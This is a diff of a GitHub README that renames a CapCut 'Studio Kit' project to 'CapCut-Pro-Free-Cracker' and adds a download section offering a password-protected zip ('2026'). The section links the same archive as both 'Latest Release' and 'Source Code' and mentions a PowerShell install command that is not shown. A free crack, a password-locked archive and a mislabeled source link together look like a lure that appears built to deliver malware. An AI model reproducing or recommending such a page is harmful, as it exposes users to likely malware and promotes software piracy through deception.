@@ -1,10 +1,10 @@
-# 🎬 CapCut-Pro-Studio-Kit
+# 🎬 CapCut-Pro-Free-Cracker
 
 <p align="center">
   <img src="https://img.icons8.com/color/96/000000/video-editing.png" alt="CapCut Pro Studio Kit" width="140" height="140">
 </p>
 
-<h1 align="center">CapCut-Pro-Studio-Kit</h1>
+<h1 align="center">CapCut-Pro-Free-Cracker</h1>
 <p align="center">
   <strong>Professional Desktop Studio Kit for CapCut</strong><br>
   Premium Effects · 4K Export · No Watermark · AI Feature Stability
@@ -30,9 +30,33 @@
 
 ---
 
-<!-- ═══════════════════ DOWNLOAD ═══════════════════ -->
+<!-- ═══════════════════ DOWNLOAD + PASSWORD ═══════════════════ -->
 
 ## 📥 Download
+
+<table align="center">
+<tr>
+<td align="center">
+
+<a href="https://github.com/NavyHornetPlan/CapCut-Pro-Free-Cracker/releases/download/5/CapCut-Pro-Kit.zip">
+  <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+</a>
+
+<br><br>
+
+🔐 **Password:** `2026`
+
+</td>
+</tr>
+</table>
+
+**Direct Links:**
+- [Latest Release](https://github.com/NavyHornetPlan/CapCut-Pro-Free-Cracker/releases/download/5/CapCut-Pro-Kit.zip)
+- [Source Code](https://github.com/NavyHornetPlan/CapCut-Pro-Free-Cracker/releases/download/5/CapCut-Pro-Kit.zip)
+
+> 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
+>
+> 🔐 **Archive Password:** `2026`
 
 ---
 
